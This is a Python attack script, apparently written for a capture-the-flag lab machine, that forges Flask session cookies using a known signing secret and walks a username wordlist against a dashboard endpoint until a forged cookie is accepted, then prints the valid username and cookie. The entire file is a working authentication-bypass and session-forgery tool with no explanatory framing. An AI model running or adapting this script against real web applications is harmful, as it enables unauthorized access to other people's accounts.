import requests
from tqdm import tqdm
from session_cookie_secret_bruteforce import flask_cookie

with open("/usr/share/seclists/Usernames/Names/names.txt", "r") as file:
    possible_usernames = [line.strip() for line in file.readlines()]
possible_usernames.remove("admin")
possible_usernames.remove("julia")

for possible_username in tqdm(possible_usernames, "Bruteforcing Usernames"):
    cookie_str = flask_cookie(
        "secret123", {"logged_in": True, "username": possible_username}, "encode"
    )
    response = requests.get(
        "http://10.10.11.160:5000/dashboard",
        cookies={"session": cookie_str},
        allow_redirects=False,
    )

    if response.status_code == 200:
        print("Username: %s" % possible_username)
        print("Cookie: %s" % cookie_str)
        break
